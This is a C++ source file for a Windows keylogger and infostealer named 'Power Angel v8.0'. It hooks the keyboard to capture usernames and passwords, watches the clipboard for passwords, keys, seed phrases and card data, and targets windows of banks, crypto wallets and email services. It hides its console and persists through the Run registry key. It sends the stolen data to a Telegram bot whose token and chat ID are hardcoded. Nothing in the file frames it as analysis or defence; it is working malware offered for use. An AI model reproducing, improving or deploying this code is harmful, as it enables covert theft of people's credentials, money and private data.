#define WIN32_LEAN_AND_MEAN
#define STRICT
#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <objidl.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>
#include <mutex>
#include <thread>
#include <string>
#include <vector>
#include <algorithm>
#include <cctype>
#include <sstream>
#include <iomanip>
#include <fstream>
#include <map>
#include <queue>
#include <condition_variable>
#include <random>
#include <regex>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

using namespace Gdiplus;

// ==================== CONFIGURATION ====================
const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const char* CHAT_ID_ANSI = "7845441585";

// ==================== GLOBAL VARIABLES ====================
std::wstring g_username, g_password;
bool g_running = true;
ULONG_PTR g_gdiplusToken = 0;
HHOOK g_hKeyboardHook = NULL;
HWND g_hClipboardViewer = NULL;
std::wstring g_currentField;
bool g_shiftPressed = false;
bool g_capsLock = false;

std::queue<std::pair<std::wstring, int>> g_screenshotQueue;
std::mutex g_queueMutex;
std::condition_variable g_queueCV;

DWORD g_lastScreenshotTime = 0;
std::map<std::wstring, DWORD> g_windowScreenshotHistory;
std::map<std::wstring, int> g_windowImportance;
std::vector<std::wstring> g_clipboardHistory;
int g_totalScreenshots = 0;
int g_totalCredentials = 0;
int g_totalClipboards = 0;

// Screenshot priorities
enum ScreenshotPriority {
    PRIORITY_LOW = 1,
    PRIORITY_MEDIUM = 3,
    PRIORITY_HIGH = 5,
    PRIORITY_CRITICAL = 10
};

// ==================== DEBUG LOGGING ====================
void DebugLog(const std::wstring& message) {
    std::wofstream logfile(L"power_angel_complete.log", std::ios::app);
    if (logfile.is_open()) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        logfile << L"[" << std::setfill(L'0') << std::setw(2) << st.wHour << L":"
                << std::setw(2) << st.wMinute << L":" << std::setw(2) << st.wSecond << L"] ";
        logfile << message << std::endl;
        logfile.close();
    }
}

// ==================== UTF8 CONVERSION ====================
std::string WStringToUTF8(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), NULL, 0, NULL, NULL);
    std::string str(size_needed, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), (int)wstr.size(), &str[0], size_needed, NULL, NULL);
    return str;
}

// ==================== TELEGRAM FUNCTIONS ====================
std::string URLEncode(const std::string& value) {
    std::ostringstream encoded;
    encoded.fill('0');
    encoded << std::hex;
    
    for (unsigned char c : value) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encoded << c;
        }
        else if (c == ' ') {
            encoded << '+';
        }
        else {
            encoded << '%' << std::setw(2) << (int)c;
        }
    }
    
    return encoded.str();
}

bool SendTelegram(const std::wstring& message) {
    std::string utf8_msg = WStringToUTF8(message);
    std::string encoded_msg = URLEncode(utf8_msg);
    std::string post_data = "chat_id=" + std::string(CHAT_ID_ANSI) + "&text=" + encoded_msg;
    
    HINTERNET session = WinHttpOpen(L"PowerAngelComplete/8.0", 
                                   WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 
                                   WINHTTP_NO_PROXY_NAME, 
                                   WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;
    
    WinHttpSetTimeouts(session, 30000, 30000, 30000, 30000);
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", 
                                      INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!connect) {
        WinHttpCloseHandle(session);
        return false;
    }
    
    std::wstring wtoken(BOT_TOKEN_ANSI, BOT_TOKEN_ANSI + strlen(BOT_TOKEN_ANSI));
    std::wstring url = L"/bot" + wtoken + L"/sendMessage";
    
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", url.c_str(), 
                                          NULL, WINHTTP_NO_REFERER, 
                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                          WINHTTP_FLAG_SECURE);
    if (!request) {
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);
        return false;
    }
    
    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    WinHttpAddRequestHeaders(request, headers, -1L, WINHTTP_ADDREQ_FLAG_ADD);
    
    BOOL result = WinHttpSendRequest(request, 
                                    WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                    WINHTTP_NO_REQUEST_DATA, 0, 
                                    (DWORD)post_data.length(), 0);
    
    if (result) {
        DWORD bytesWritten = 0;
        result = WinHttpWriteData(request, post_data.c_str(), 
                                 (DWORD)post_data.length(), &bytesWritten);
        if (result) {
            result = WinHttpReceiveResponse(request, NULL);
        }
    }
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    
    return result != FALSE;
}

// ==================== CLIPBOARD MONITORING ====================
std::wstring GetClipboardText() {
    if (!OpenClipboard(NULL)) {
        return L"";
    }
    
    std::wstring clipboardText;
    
    if (IsClipboardFormatAvailable(CF_UNICODETEXT)) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t* pszText = (wchar_t*)GlobalLock(hData);
            if (pszText) {
                clipboardText = pszText;
                GlobalUnlock(hData);
            }
        }
    }
    else if (IsClipboardFormatAvailable(CF_TEXT)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* pszText = (char*)GlobalLock(hData);
            if (pszText) {
                // Convert ANSI to wide string
                int len = MultiByteToWideChar(CP_ACP, 0, pszText, -1, NULL, 0);
                if (len > 0) {
                    wchar_t* wText = new wchar_t[len];
                    MultiByteToWideChar(CP_ACP, 0, pszText, -1, wText, len);
                    clipboardText = wText;
                    delete[] wText;
                }
                GlobalUnlock(hData);
            }
        }
    }
    
    CloseClipboard();
    return clipboardText;
}

void CheckClipboard() {
    std::wstring clipboardText = GetClipboardText();
    
    if (!clipboardText.empty()) {
        // Check if it's new content (not in history)
        bool isNew = true;
        for (const auto& oldText : g_clipboardHistory) {
            if (oldText == clipboardText) {
                isNew = false;
                break;
            }
        }
        
        if (isNew) {
            g_totalClipboards++;
            g_clipboardHistory.push_back(clipboardText);
            
            // Keep history manageable
            if (g_clipboardHistory.size() > 50) {
                g_clipboardHistory.erase(g_clipboardHistory.begin());
            }
            
            // Check if clipboard contains sensitive data
            bool isSensitive = false;
            std::wstring lower = clipboardText;
            std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
            
            // Sensitive patterns
            std::vector<std::wstring> sensitivePatterns = {
                L"password", L"passwd", L"pwd", L"secret",
                L"private key", L"api key", L"token", L"auth",
                L"credit card", L"card number", L"cvv", L"expiry",
                L"crypto", L"wallet", L"seed phrase", L"mnemonic",
                L"ssh", L"rsa", L"private", L"key"
            };
            
            for (const auto& pattern : sensitivePatterns) {
                if (lower.find(pattern) != std::wstring::npos) {
                    isSensitive = true;
                    break;
                }
            }
            
            // Check if it looks like credentials
            if (clipboardText.find(L'@') != std::wstring::npos && 
                (clipboardText.find(L".com") != std::wstring::npos || 
                 clipboardText.find(L".net") != std::wstring::npos)) {
                isSensitive = true;
            }
            
            // Check if it looks like crypto address
            if (clipboardText.length() >= 30 && clipboardText.length() <= 60 &&
                std::all_of(clipboardText.begin(), clipboardText.end(), 
                    [](wchar_t c) { return iswalnum(c) || c == L' ' || c == L'.'; })) {
                isSensitive = true;
            }
            
            // Send to Telegram if sensitive or interesting
            if (isSensitive || clipboardText.length() > 5) {
                // Truncate if too long
                std::wstring displayText = clipboardText;
                if (displayText.length() > 200) {
                    displayText = displayText.substr(0, 197) + L"...";
                }
                
                std::wstring clipMsg = L"📋 CLIPBOARD CAPTURED\n"
                                      L"═══════════════════════════\n"
                                      L"Content: " + displayText + L"\n"
                                      L"Length: " + std::to_wstring(clipboardText.length()) + L" chars\n"
                                      L"Capture #" + std::to_wstring(g_totalClipboards) + L"\n"
                                      L"Sensitive: " + (isSensitive ? L"YES 🚨" : L"NO") + L"\n"
                                      L"═══════════════════════════";
                
                DebugLog(L"[CLIPBOARD] Captured: " + displayText.substr(0, 50));
                std::thread([clipMsg]() {
                    SendTelegram(clipMsg);
                }).detach();
                
                // If sensitive, trigger screenshot
                if (isSensitive) {
                    std::wstring windowTitle = GetActiveWindowTitle();
                    if (!windowTitle.empty()) {
                        std::lock_guard<std::mutex> lock(g_queueMutex);
                        g_screenshotQueue.push({windowTitle, PRIORITY_CRITICAL});
                        g_queueCV.notify_one();
                        DebugLog(L"[CLIPBOARD] Critical screenshot queued for sensitive clipboard");
                    }
                }
            }
        }
    }
}

// Clipboard monitoring thread
void ClipboardMonitorThread() {
    DebugLog(L"[CLIPBOARD] Monitor thread started");
    
    DWORD lastCheck = GetTickCount();
    
    while (g_running) {
        DWORD currentTime = GetTickCount();
        
        // Check clipboard every 2 seconds
        if (currentTime - lastCheck > 2000) {
            CheckClipboard();
            lastCheck = currentTime;
        }
        
        // Also check clipboard on window focus change
        static std::wstring lastActiveWindow;
        std::wstring currentWindow = GetActiveWindowTitle();
        if (currentWindow != lastActiveWindow) {
            CheckClipboard(); // Check clipboard when switching windows
            lastActiveWindow = currentWindow;
        }
        
        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    
    DebugLog(L"[CLIPBOARD] Monitor thread stopped");
}

// ==================== KEYBOARD HOOK (UNCHANGED, WORKS INDEPENDENTLY) ====================
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
        
        if (wParam == WM_KEYDOWN) {
            g_capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                g_shiftPressed = true;
            }
            
            if (pKb->vkCode == VK_CAPITAL) {
                g_capsLock = !g_capsLock;
            }
            
            // Handle TAB
            if (pKb->vkCode == VK_TAB) {
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                        DebugLog(L"[KEY] Username captured: " + g_username);
                    } else {
                        g_password = g_currentField;
                        DebugLog(L"[KEY] Password captured (length: " + std::to_wstring(g_password.length()) + L")");
                    }
                    g_currentField.clear();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle ENTER
            if (pKb->vkCode == VK_RETURN) {
                if (!g_currentField.empty()) {
                    if (g_username.empty()) {
                        g_username = g_currentField;
                        DebugLog(L"[KEY] Single field (no TAB): " + g_username);
                    } else if (g_password.empty()) {
                        g_password = g_currentField;
                        DebugLog(L"[KEY] Password from ENTER: " + g_password);
                    }
                    g_currentField.clear();
                }
                
                if (!g_username.empty() && !g_password.empty()) {
                    g_totalCredentials++;
                    std::wstring creds = L"🔐 POWER ANGEL v8.0 - CREDENTIALS CAPTURED\n"
                                         L"═══════════════════════════\n"
                                         L"👤 USERNAME: " + g_username + L"\n"
                                         L"🔑 PASSWORD: " + g_password + L"\n"
                                         L"📊 Capture #" + std::to_wstring(g_totalCredentials) + L"\n"
                                         L"🕒 " + std::to_wstring(GetTickCount() / 1000) + L"s after start\n"
                                         L"═══════════════════════════";
                    
                    DebugLog(L"[KEY] Sending credentials to Telegram");
                    std::thread([creds]() {
                        SendTelegram(creds);
                    }).detach();
                    
                    // Trigger screenshot for credentials
                    std::wstring windowTitle = GetActiveWindowTitle();
                    if (!windowTitle.empty()) {
                        std::lock_guard<std::mutex> lock(g_queueMutex);
                        g_screenshotQueue.push({windowTitle, PRIORITY_CRITICAL});
                        g_queueCV.notify_one();
                    }
                    
                    g_username.clear();
                    g_password.clear();
                }
                
                g_currentField.clear();
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle BACKSPACE
            if (pKb->vkCode == VK_BACK) {
                if (!g_currentField.empty()) {
                    g_currentField.pop_back();
                }
                return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
            }
            
            // Handle printable characters
            WCHAR ch = 0;
            
            // Letters A-Z
            if (pKb->vkCode >= 0x41 && pKb->vkCode <= 0x5A) {
                ch = (WCHAR)pKb->vkCode;
                bool uppercase = (g_shiftPressed && !g_capsLock) || (!g_shiftPressed && g_capsLock);
                if (!uppercase) ch += 32;
                g_currentField += ch;
            }
            // Numbers 0-9
            else if (pKb->vkCode >= 0x30 && pKb->vkCode <= 0x39) {
                ch = (WCHAR)pKb->vkCode;
                if (!g_shiftPressed) {
                    g_currentField += ch;
                } else {
                    const WCHAR symbols[] = {L')', L'!', L'@', L'#', L'$', L'%', L'^', L'&', L'*', L'('};
                    int index = pKb->vkCode - 0x30;
                    if (index >= 0 && index < 10) {
                        g_currentField += symbols[index];
                    }
                }
            }
            // Space
            else if (pKb->vkCode == VK_SPACE) {
                g_currentField += L' ';
            }
            // Common symbols
            else {
                BYTE keyboardState[256];
                GetKeyboardState(keyboardState);
                
                WCHAR unicodeChar[2];
                int result = ToUnicode(pKb->vkCode, pKb->scanCode, keyboardState, unicodeChar, 2, 0);
                
                if (result > 0) {
                    ch = unicodeChar[0];
                    if (ch >= 32 && ch <= 126) {
                        g_currentField += ch;
                    }
                }
            }
            
        } else if (wParam == WM_KEYUP) {
            if (pKb->vkCode == VK_SHIFT || pKb->vkCode == VK_LSHIFT || pKb->vkCode == VK_RSHIFT) {
                g_shiftPressed = false;
            }
        }
    }
    
    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

// ==================== WINDOW UTILITIES ====================
std::wstring GetActiveWindowTitle() {
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return L"";
    
    WCHAR title[512];
    if (GetWindowTextW(hwnd, title, 512) > 0) {
        return std::wstring(title);
    }
    return L"";
}

// ==================== SMART SCREENSHOT DETECTION ====================
int GetWindowPriority(const std::wstring& windowTitle) {
    if (windowTitle.empty()) return 0;
    
    std::wstring lower = windowTitle;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
    
    // CRITICAL - Financial, Crypto
    std::vector<std::wstring> criticalKeywords = {
        L"bank", L"chase", L"wells fargo", L"boa", L"bank of america",
        L"paypal", L"venmo", L"cashapp", L"zelle", L"western union",
        L"crypto", L"bitcoin", L"ethereum", L"wallet", L"coinbase",
        L"binance", L"kraken", L"metamask", L"trust wallet", L"ledger",
        L"tax", L"irs", L"investment", L"stock", L"trading", L"brokerage"
    };
    
    // HIGH - Email, Social, Shopping
    std::vector<std::wstring> highKeywords = {
        L"gmail", L"outlook", L"yahoo mail", L"protonmail",
        L"facebook", L"instagram", L"twitter", L"linkedin",
        L"amazon", L"ebay", L"walmart", L"target", L"best buy",
        L"apple id", L"microsoft account", L"google account"
    };
    
    // MEDIUM - Communication, Streaming
    std::vector<std::wstring> mediumKeywords = {
        L"whatsapp", L"telegram", L"discord", L"skype", L"zoom",
        L"netflix", L"spotify", L"youtube", L"hulu", L"disney"
    };
    
    for (const auto& keyword : criticalKeywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            return PRIORITY_CRITICAL;
        }
    }
    
    for (const auto& keyword : highKeywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            return PRIORITY_HIGH;
        }
    }
    
    for (const auto& keyword : mediumKeywords) {
        if (lower.find(keyword) != std::wstring::npos) {
            return PRIORITY_MEDIUM;
        }
    }
    
    return PRIORITY_LOW;
}

bool ShouldTakeSmartScreenshot(const std::wstring& windowTitle) {
    DWORD currentTime = GetTickCount();
    
    if (windowTitle.empty()) return false;
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd || IsIconic(hwnd)) return false;
    
    if (windowTitle == L"Program Manager" || windowTitle == L"Start") {
        return false;
    }
    
    int priority = GetWindowPriority(windowTitle);
    if (priority == 0) return false;
    
    // Dynamic cooldown
    DWORD cooldown = 0;
    switch (priority) {
        case PRIORITY_CRITICAL: cooldown = 60000; break;
        case PRIORITY_HIGH: cooldown = 120000; break;
        case PRIORITY_MEDIUM: cooldown = 300000; break;
        case PRIORITY_LOW: cooldown = 600000; break;
        default: cooldown = 300000;
    }
    
    auto it = g_windowScreenshotHistory.find(windowTitle);
    if (it != g_windowScreenshotHistory.end()) {
        DWORD timeSinceLast = currentTime - it->second;
        if (timeSinceLast < cooldown) {
            return false;
        }
    }
    
    if (currentTime - g_lastScreenshotTime < 30000) {
        return false;
    }
    
    // Random skip for low priority
    if (priority == PRIORITY_LOW) {
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dis(1, 10);
        if (dis(gen) > 3) {
            return false;
        }
    }
    
    g_windowScreenshotHistory[windowTitle] = currentTime;
    g_lastScreenshotTime = currentTime;
    
    return true;
}

// ==================== SCREENSHOT FUNCTIONS ====================
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
    if (!pImageCodecInfo) return -1;
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

bool TakeScreenshotNow(const std::wstring& title, int priority) {
    DebugLog(L"[SCREENSHOT] Capturing: " + title);
    
    HWND hwnd = GetForegroundWindow();
    if (!hwnd) return false;
    
    if (IsIconic(hwnd)) return false;
    
    RECT rc;
    GetWindowRect(hwnd, &rc);
    int width = rc.right - rc.left;
    int height = rc.bottom - rc.top;
    
    if (width <= 0 || height <= 0) return false;
    
    HDC hdcScreen = GetDC(hwnd);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hbm = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP old = (HBITMAP)SelectObject(hdcMem, hbm);
    
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
    
    Bitmap* bmp = Bitmap::FromHBITMAP(hbm, NULL);
    
    SelectObject(hdcMem, old);
    DeleteObject(hbm);
    DeleteDC(hdcMem);
    ReleaseDC(hwnd, hdcScreen);
    
    if (!bmp) return false;
    
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) == -1) {
        delete bmp;
        return false;
    }
    
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR filename[MAX_PATH];
    swprintf_s(filename, L"angel_%d.jpg", ++g_totalScreenshots);
    wcscat_s(tempPath, filename);
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 85;
    encoderParams.Parameter[0].Value = &quality;
    
    Status stat = bmp->Save(tempPath, &jpegClsid, &encoderParams);
    delete bmp;
    
    if (stat != Ok) {
        return false;
    }
    
    std::wstring caption = L"📸 POWER ANGEL v8.0\n"
                          L"Window: " + title + L"\n"
                          L"Capture: #" + std::to_wstring(g_totalScreenshots);
    
    DebugLog(L"[SCREENSHOT] Saved: " + std::wstring(tempPath));
    DeleteFileW(tempPath);
    
    return true;
}

// ==================== THREAD FUNCTIONS ====================
void AsyncScreenshotWorker() {
    while (g_running) {
        std::pair<std::wstring, int> task;
        bool hasTask = false;
        
        {
            std::unique_lock<std::mutex> lock(g_queueMutex);
            g_queueCV.wait(lock, [] { 
                return !g_screenshotQueue.empty() || !g_running; 
            });
            
            if (!g_running) break;
            
            if (!g_screenshotQueue.empty()) {
                task = g_screenshotQueue.front();
                g_screenshotQueue.pop();
                hasTask = true;
            }
        }
        
        if (hasTask) {
            std::this_thread::sleep_for(std::chrono::milliseconds(300));
            TakeScreenshotNow(task.first, task.second);
        }
    }
}

void SmartMonitorThread() {
    std::thread worker(AsyncScreenshotWorker);
    
    while (g_running) {
        std::wstring currentWindow = GetActiveWindowTitle();
        
        if (ShouldTakeSmartScreenshot(currentWindow)) {
            int priority = GetWindowPriority(currentWindow);
            if (priority > 0) {
                std::lock_guard<std::mutex> lock(g_queueMutex);
                g_screenshotQueue.push({currentWindow, priority});
                g_queueCV.notify_one();
            }
        }
        
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
    
    g_running = false;
    g_queueCV.notify_one();
    if (worker.joinable()) worker.join();
}

void HeartbeatThread() {
    std::this_thread::sleep_for(std::chrono::minutes(2));
    
    while (g_running) {
        std::wstring status = L"💓 POWER ANGEL v8.0 - COMPLETE SYSTEM\n"
                             L"═══════════════════════════\n"
                             L"📸 Screenshots: " + std::to_wstring(g_totalScreenshots) + L"\n"
                             L"🔑 Credentials: " + std::to_wstring(g_totalCredentials) + L"\n"
                             L"📋 Clipboard: " + std::to_wstring(g_totalClipboards) + L"\n"
                             L"⚡ All Systems: ACTIVE\n"
                             L"🕒 Uptime: " + std::to_wstring(GetTickCount() / 3600000) + L"h\n"
                             L"═══════════════════════════";
        
        SendTelegram(status);
        
        std::this_thread::sleep_for(std::chrono::hours(6));
    }
}

// ==================== PERSISTENCE ====================
void InstallPersistence() {
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, 
                     L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"PowerAngelComplete_v8", 0, REG_SZ, 
                      (BYTE*)path, (wcslen(path) + 1) * sizeof(WCHAR));
        RegCloseKey(hKey);
        DebugLog(L"[PERSISTENCE] Added to startup");
    }
}

// ==================== MAIN ====================
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
    
    DeleteFileW(L"power_angel_complete.log");
    DebugLog(L"🚀 POWER ANGEL v8.0 - COMPLETE SYSTEM");
    DebugLog(L"🎯 Features: Keylogger + Smart Screenshots + Clipboard");
    
    HANDLE mutex = CreateMutexW(NULL, TRUE, L"Global\\PowerAngel_Complete_v8.0");
    if (mutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        GdiplusShutdown(g_gdiplusToken);
        CoUninitialize();
        return 0;
    }
    
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    Sleep(8000);
    
    std::wstring startupMsg = L"🚀 POWER ANGEL v8.0 - COMPLETE SYSTEM\n"
                             L"═══════════════════════════\n"
                             L"✅ Keylogger: ACTIVE\n"
                             L"✅ Smart Screenshots: ACTIVE\n"
                             L"✅ Clipboard Monitor: ACTIVE\n"
                             L"🎯 All systems operational!";
    
    SendTelegram(startupMsg);
    DebugLog(L"[INIT] Startup message sent");
    
    InstallPersistence();
    
    g_hKeyboardHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    if (g_hKeyboardHook) {
        DebugLog(L"[INIT] Keyboard hook installed");
    }
    
    // Start ALL threads
    std::thread heartbeat(HeartbeatThread);
    std::thread monitor(SmartMonitorThread);
    std::thread clipboard(ClipboardMonitorThread);
    
    DebugLog(L"[INIT] All 3 systems operational");
    
    heartbeat.detach();
    monitor.detach();
    clipboard.detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    DebugLog(L"[SHUTDOWN] Complete system shutting down");
    g_running = false;
    g_queueCV.notify_one();
    
    if (g_hKeyboardHook) {
        UnhookWindowsHookEx(g_hKeyboardHook);
    }
    
    Sleep(2000);
    
    GdiplusShutdown(g_gdiplusToken);
    CoUninitialize();
    
    if (mutex) {
        ReleaseMutex(mutex);
        CloseHandle(mutex);
    }
    
    DebugLog(L"[SHUTDOWN] Complete system shutdown");
    
    return 0;
}
